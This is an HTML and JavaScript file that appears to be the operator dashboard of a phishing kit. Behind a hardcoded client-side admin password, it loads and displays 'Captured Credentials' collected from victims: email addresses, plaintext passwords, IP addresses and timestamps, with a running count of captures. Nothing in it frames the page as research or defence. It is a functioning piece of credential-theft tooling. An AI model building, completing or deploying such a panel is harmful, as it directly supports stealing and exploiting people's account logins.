<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Captured Data</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #0f1419;
            color: #e7e9ea;
            min-height: 100vh;
        }

        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 2rem;
            background: #1a1f24;
            border-radius: 12px;
            border: 1px solid #2f3336;
        }

        .login-container h2 {
            margin-bottom: 1.5rem;
            text-align: center;
        }

        .login-container input {
            width: 100%;
            padding: 0.8rem;
            margin-bottom: 1rem;
            background: #0f1419;
            border: 1px solid #2f3336;
            border-radius: 6px;
            color: #e7e9ea;
            font-size: 1rem;
        }

        .login-container button {
            width: 100%;
            padding: 0.8rem;
            background: #1d9bf0;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
        }

        .header {
            background: #1a1f24;
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #2f3336;
        }

        .container {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 0 1rem;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .stat-card {
            background: #1a1f24;
            padding: 1.5rem;
            border-radius: 12px;
            border: 1px solid #2f3336;
        }

        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            color: #1d9bf0;
        }

        .stat-label {
            color: #71767b;
            font-size: 0.9rem;
        }

        .data-table {
            background: #1a1f24;
            border-radius: 12px;
            border: 1px solid #2f3336;
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            padding: 1rem;
            background: #1a1f24;
            color: #71767b;
            font-size: 0.85rem;
            text-transform: uppercase;
            border-bottom: 1px solid #2f3336;
        }

        td {
            padding: 1rem;
            border-bottom: 1px solid #2f3336;
        }

        .password-text {
            font-family: 'Courier New', monospace;
            color: #ff6b6b;
        }

        .empty-state {
            text-align: center;
            padding: 4rem;
            color: #71767b;
        }

        .empty-state i {
            font-size: 4rem;
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div id="loginSection" class="login-container">
        <h2><i class="fas fa-lock"></i> Admin Login</h2>
        <input type="password" id="adminPassword" placeholder="Enter admin password">
        <button onclick="login()">Login</button>
    </div>

    <div id="adminSection" style="display:none;">
        <div class="header">
            <h1><i class="fas fa-database"></i> Captured Credentials</h1>
            <button onclick="logout()" style="background:#ff4444;color:white;border:none;padding:0.5rem 1rem;border-radius:6px;cursor:pointer;">
                <i class="fas fa-sign-out-alt"></i> Logout
            </button>
        </div>

        <div class="container">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value" id="totalCount">0</div>
                    <div class="stat-label">Total Captures</div>
                </div>
            </div>

            <div class="data-table">
                <div class="empty-state" id="emptyState">
                    <i class="fas fa-inbox"></i>
                    <p>No data captured yet</p>
                </div>
                <table id="dataTable" style="display:none;">
                    <thead>
                        <tr>
                            <th>Email</th>
                            <th>Password</th>
                            <th>IP Address</th>
                            <th>Timestamp</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody"></tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const ADMIN_PASSWORD = 'admin123'; // Change this!

        function login() {
            const password = document.getElementById('adminPassword').value;
            if (password === ADMIN_PASSWORD) {
                document.getElementById('loginSection').style.display = 'none';
                document.getElementById('adminSection').style.display = 'block';
                loadData();
            } else {
                alert('Wrong password!');
            }
        }

        function logout() {
            document.getElementById('adminSection').style.display = 'none';
            document.getElementById('loginSection').style.display = 'block';
        }

        async function loadData() {
            try {
                const response = await fetch(`/api/get-data?password=${ADMIN_PASSWORD}`);
                const data = await response.json();
                
                if (data.success && data.data.length > 0) {
                    document.getElementById('emptyState').style.display = 'none';
                    document.getElementById('dataTable').style.display = 'table';
                    document.getElementById('totalCount').textContent = data.data.length;
                    
                    const tableBody = document.getElementById('tableBody');
                    tableBody.innerHTML = data.data.map(item => `
                        <tr>
                            <td>${item.email}</td>
                            <td class="password-text">${item.password}</td>
                            <td>${item.ip}</td>
                            <td>${item.timestamp}</td>
                        </tr>
                    `).join('');
                } else {
                    document.getElementById('totalCount').textContent = '0';
                }
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }

        // Check if already logged in
        if (sessionStorage.getItem('adminLoggedIn') === 'true') {
            document.getElementById('loginSection').style.display = 'none';
            document.getElementById('adminSection').style.display = 'block';
            loadData();
        }
    </script>
</body>
</html>
